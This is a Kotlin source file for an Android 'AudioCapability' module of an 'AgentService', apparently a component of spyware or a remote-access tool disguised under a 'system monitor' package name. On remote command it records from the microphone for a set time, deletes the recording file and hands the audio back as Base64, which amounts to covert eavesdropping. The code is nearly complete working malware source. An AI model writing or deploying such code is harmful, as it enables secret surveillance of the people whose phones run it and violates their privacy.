package com.system.monitor.capabilities

import android.media.MediaRecorder
import android.os.Environment
import com.google.gson.Gson
import com.system.monitor.AgentService
import java.io.File
import java.io.FileInputStream

class AudioCapability(private val service: AgentService) : AgentService.Capability {

    private var recorder: MediaRecorder? = null
    private var outputFile: File? = null
    private val gson = Gson()

    override fun execute(args: String?): Any {
        val params = gson.fromJson(args ?: "{}", Params::class.java)
        return when (params.action) {
            "start" -> startRecording(params.duration ?: 30)
            "stop" -> stopRecording()
            else -> mapOf("error" to "invalid action")
        }
    }

    private fun startRecording(duration: Int): Map<String, Any> {
        if (recorder != null) return mapOf("error" to "already recording")
        outputFile = File(service.getExternalFilesDir(Environment.DIRECTORY_MUSIC), "rec_${System.currentTimeMillis()}.3gp")
        recorder = MediaRecorder().apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
            setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
            setOutputFile(outputFile!!.absolutePath)
            try {
                prepare()
                start()
            } catch (e: Exception) {
                return mapOf("error" to e.message)
            }
        }
        thread(name = "audio-stop") {
            Thread.sleep(duration * 1000L)
            stopRecording()
        }
        return mapOf("status" to "recording")
    }

    private fun stopRecording(): Map<String, Any> {
        recorder?.apply { stop(); release() }
        recorder = null
        return outputFile?.let { file ->
            val bytes = file.readBytes()
            file.delete()
            mapOf("audio" to android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP))
        } ?: mapOf("error" to "no recording")
    }

    override fun cleanup() { stopRecording() }

    data class Params(val action: String, val duration: Int? = null)
}